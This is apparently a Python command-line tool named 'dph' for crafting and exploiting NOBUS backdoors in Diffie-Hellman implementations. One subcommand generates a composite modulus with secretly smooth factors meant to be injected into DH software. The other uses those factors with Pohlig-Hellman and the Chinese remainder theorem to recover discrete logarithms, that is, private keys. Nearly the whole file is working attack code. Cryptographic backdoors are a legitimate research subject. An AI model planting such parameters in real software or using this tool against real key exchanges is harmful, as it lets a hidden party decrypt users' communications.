#!/usr/bin/python
# -*- coding: utf-8 -*-

from . import *

from binascii import hexlify
from gmpy2 import *
import os


DEFAULT_FIELD_SIZE = 2048

DEFAULT_SMOOTHNESS = 32


__all__ = [ 'DEFAULT_FIELD_SIZE', 'DEFAULT_SMOOTHNESS' ]


def _gen(args):
    seed = int(hexlify(os.urandom(16)).decode(), 16)
    state = random_state(seed)

    p_factors, p, q_factors, q, n = get_params(state, args.bits, args.smoothness)

    print(f'p = 0x{p.digits(16)}')
    print()
    print(f'p_factors = [')
    for factor in p_factors:
        print(f'    0x{factor.digits(16)},')
    print(f']', end='\n\n')

    print(f'q = 0x{q.digits(16)}')
    print()
    print(f'q_factors = [')
    for factor in q_factors:
        print(f'    0x{factor.digits(16)},')
    print(f']', end='\n\n')

    print(f'n = 0x{n.digits(16)}')
    print()

    if Config.verbose:
        print(f'# p ({p.bit_length()} bits)')
        print(f'# q ({q.bit_length()} bits)')
        print(f'# n ({n.bit_length()} bits)')

def _exp(args):
    g = args.g
    h = args.h

    p_factors = list(map(mpz, args.p_factors.split(',')))
    try:
        p_factors.remove(2)
    except ValueError:
        pass
    q_factors = list(map(mpz, args.q_factors.split(',')))
    try:
        q_factors.remove(2)
    except ValueError:
        pass

    p = 2 * product(*p_factors) + 1
    q = 2 * product(*q_factors) + 1

    if Config.verbose:
        print(f'p = 0x{p.digits(16)}')
        print(f'q = 0x{q.digits(16)}')
        print()
        print(f'Compute the discrete logarithm modulo `p`')
        print(f'-----------------------------------------')
    px = pohlig(g % p, h % p, p, p_factors)
    if Config.verbose:
        print()
        print(f'Compute the discrete logarithm modulo `q`')
        print(f'-----------------------------------------')
    qx = pohlig(g % q, h % q, q, q_factors)
    if Config.verbose:
        print()

    pp = (p - 1) // gcd(p - 1, px)
    qq = (q - 1) // gcd(q - 1, qx)

    x = crt([px, qx], [pp, qq])

    print(f'x = 0x{x.digits(16)}')


def _main():
    from argparse import ArgumentParser

    parser = ArgumentParser(description='Craft and exploit NOBUS backdoors in Diffie-Hellman implementations.')

    parser.prog = 'dph'

    parser.add_argument('-q', '--quiet', help='enable quiet output', dest='verbose', action='store_false')

    subparsers = parser.add_subparsers()
    gen_parser = subparsers.add_parser('gen', help='generate special parameters to inject a NOBUS backdoor into a Diffie-Hellman implementation')
    exp_parser = subparsers.add_parser('exp', help='exploit an existing backdoor in a Diffie-Hellman implementation')

    gen_parser.description = 'Generate special parameters to inject a NOBUS backdoor into a Diffie-Hellman (DH) implementation.'

    gen_parser.add_argument(
            '-b', '--bits',
            help='the number of bits in the backdoor DH modulus [default: %(default)s]',
            type=int,
            default=DEFAULT_FIELD_SIZE
            )
    gen_parser.add_argument(
            '--smoothness',
            help='the maximum size (in bits) of any prime sub-factor, forming `p - 1` or `q - 1`, where `p` and `q` are the prime factors of the backdoor DH modulus [default: %(default)s]',
            type=int,
            default=DEFAULT_SMOOTHNESS
            )

    gen_parser.set_defaults(func=_gen)

    exp_parser.description = 'Solve the discrete logarithm (i.e. Find x s.t. `g^x = h (mod n)`) for a given congruence pair.'

    int_ = lambda x: int(x, 0)

    exp_parser.add_argument('p_factors', help='a comma-separated list of the prime sub-factors of the 1st prime factor, `p`, of the backdoor Diffie-Hellman modulus', type=str)
    exp_parser.add_argument('q_factors', help='a comma-separated list of the prime sub-factors of the 2nd prime factor, `q`, of the backdoor Diffie-Hellman modulus', type=str)
    exp_parser.add_argument('g', help='the generator of the Diffie-Hellman implementation', type=int_)
    exp_parser.add_argument('h', help='the congruent value', type=int_)

    exp_parser.set_defaults(func=_exp)

    args = parser.parse_args()

    Config.verbose = args.verbose

    args.func(args)


if __name__ == '__main__':
    _main()
